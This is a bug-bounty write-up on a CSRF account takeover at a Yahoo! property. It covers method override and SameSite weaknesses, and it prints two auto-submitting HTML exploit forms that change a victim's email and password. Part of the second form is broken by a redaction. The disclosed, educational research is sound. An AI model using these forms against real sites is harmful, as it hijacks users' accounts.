---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-06-16_alternative-link.md
original_filename: 2022-06-16_alternative-link.md
title: Alternative link
category: documents
detected_topics:
- csrf
- command-injection
- otp
- api-security
tags:
- imported
- documents
- csrf
- command-injection
- otp
- api-security
language: en
raw_sha256: 7381e6d1724f57aca18454174c96fcd4270af8ce35c71f61d1ba3163c4160cc4
text_sha256: 1db51359752848f343e26b6cecf26371fd95e88132fd82d0699c17c10bfde09b
ingested_at: '2026-06-28T07:32:12Z'
sensitivity: unknown
redactions_applied: true
---

# Alternative link

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-06-16_alternative-link.md
- Source Type: markdown
- Detected Topics: csrf, command-injection, otp, api-security
- Ingested At: 2026-06-28T07:32:12Z
- Redactions Applied: True
- Raw SHA256: `7381e6d1724f57aca18454174c96fcd4270af8ce35c71f61d1ba3163c4160cc4`
- Text SHA256: `1db51359752848f343e26b6cecf26371fd95e88132fd82d0699c17c10bfde09b`


## Content

---
title: "Alternative link"
page_title: "CSRF leads to account takeover in Yahoo! | by Retr02332 | InfoSec Write-ups"
url: "https://retr02332.medium.com/csrf-leads-to-account-takeover-in-yahoo-aa96c678d2aa"
authors: ["Retr02332 (@Retr02332)"]
programs: ["Yahoo! / Verizon Media"]
bugs: ["CSRF", "Account takeover"]
bounty: "3,000"
publication_date: "2022-06-16"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 2541
scraped_via: "browseros"
---

# Alternative link

CSRF leads to account takeover in Yahoo!
Retr02332
Follow
6 min read
·
Jun 16, 2022

304

4

Press enter or click to view image in full size

Hi everyone!

During my bug bounty journey I used to read numerous writings to learn different techniques and points of view when hunting. Most of the writings I read were from researchers who had managed to hack Yahoo!. It was because of this that I set out to hack Yahoo! and did not rest until I succeeded. Fortunately, I managed to hack them in only 30 minutes. So without further ado, here is this incredible story.

After listing all the domains I could and checking which ones ran a web server, I focused on the ones that did not contain the word Yahoo!. Somehow I felt that in these subdomains I had a better chance of finding a good security flaw. Among all the filtered domains I decided to go for one, which I will call vulnerable.com.

Focusing on high-severity vulnerabilities

Personally, I don’t like to waste my time with low severity bugs. I like challenges. So after analyzing the application in question for quite a while I thought of analyzing the functionality to update the user’s account data. I wanted to see if by any chance I could find a CSRF (although at the time I didn’t have much faith in finding a CSRF in such an obvious place, let alone in a company like Yahoo!).

So I went to the functionality to change the user account data, and changed the email from victim@gmail.com to netstat2332@gmail.com.

Original request

The original email change request looked as follows:

Press enter or click to view image in full size
Original request with arbitrary origin

Since we are trying to achieve a CSRF, it is convenient to verify if the server accepts requests with arbitrary origins. Some servers do not allow requests from arbitrary origins to be initiated. However, the server was friendly and allowed any domain to send HTTP requests to it:

Press enter or click to view image in full size
Original request with a different HTTP method

At this point, I was about to create the malicious HTTP form to exploit CSRF. However, I noticed that the requests were made using the HTTP PATCH method.

This is a problem, since HTTP forms only accept a limited set of HTTP methods. So the first thing that occurred to me was to change the HTTP method directly to POST. However, this did not work:

Press enter or click to view image in full size
Original request with a different Content-Type

After that I took a moment to think about what else I could try or how else I could cause unexpected behavior on the server. So I came up with the idea to change the value of the Content-type header from application/json to application/x-www-form-urlencoded:

Press enter or click to view image in full size

Seeing this, I decided to transform the body of the request from JSON to urlencoded to see if the error is still present in the server responses.

Original request with HTTP method override

I already rewrote the body of the request from JSON to urlencoded. However, we still have to send this request with the POST method. Since the HTTP forms, as we saw before, only work with GET/POST methods.

Get Retr02332’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

The problem here is that the backend expects this request to arrive with the PATCH method. After some thought I came up with a way to alter the HTTP method before it reaches the server. To accomplish this there are several techniques and each of these depends heavily on the programming language used in the backend.

So I used wappalyzer to see what technologies the application was using. Thanks to this, I was able to realize that the backend of the application was written on Ruby On Rails. This framework fortunately offers a way to achieve the HTTP method override that we want so much.

Finally, with all these ingredients together we managed to bypass all the restrictions present in the application to be able to exploit a CSRF that will allow us to steal arbitrary user accounts with a single click:

Press enter or click to view image in full size
Exploit to change the user’s email address

The exploit used to exploit this vulnerability is as follows:

<!DOCTYPE html>
<html>
<body>
<form action=”https://vulnerable.com/api/v2/users/update" method=”POST”>
<input type=”hidden” name=”_method” value=”patch” />
<input type=”hidden” name=”user[email]” value=”bello.carlos@something.com” />
<input type=”hidden” name=”user[something]” value=”null” />
<input type=”hidden” name=”user[promo_code]” value=”” />
<input type=”hidden” name=”user[third_party_emails]” value=”null” />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>

Exploit to change user password

After reporting the bug, I realized that the exploit could also be used to change the user’s password. This is because the application did not prompt for the current password=***REDACTED*** html>
<html>
<body>
<form action=”https://vulnerable.com/api/v2/users/update" method=”POST”>
<input type=”hidden” name=”_method” value=”patch” />
<input type=”hidden” name=”password” value=”you+have+been+hacked+by+Retr02332" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>

Press enter or click to view image in full size

Since we are able to change the password and email (the password recovery way), we have managed to completely obtain the account of any user of the application with just one click.

Why doesn’t an application like Yahoo! have at least one Anti-CSRF token?

I wanted to save the best for last, I’m sure many of you are unaware of this (although I don’t know if this technique still works in Chrome today).

It turns out that Yahoo! did not define a specific SameSite for the session cookie used in the requests. This is not a major risk in firefox, as it uses LAX by default. This prevents exploiting this vulnerability in this browser. Apparently, Yahoo! developers thought that all browsers would set these cookies in LAX and thus would not have to use an Anti-CSRF token (this is why it is necessary to have several layers of security, it is better to be cautious than confident).

However, in Chrome it is a different story. It happens that Chrome, for compatibility reasons, temporarily allowed cookies that do not explicitly set the SameSite attribute, to be treated as None for a time limit of two minutes. After that, the browser will set them to LAX. Chrome named this feature LAX+POST, and you can find more details about it here. There are several techniques to make these two minutes specified by Chrome longer. These techniques can be found here.

I’m not sure if this trick still works in Chrome currently. If it works for you in a recent version of Chrome, let me know in the comments box ;)

Report accepted and rewarded

Once I reported this error, it was accepted within a few days and rewarded after 3 months:

Press enter or click to view image in full size
Press enter or click to view image in full size
Goodbye

This was all for now, I hope you enjoyed and learned as much as I did. Thanks for reading and Happy Hacking !
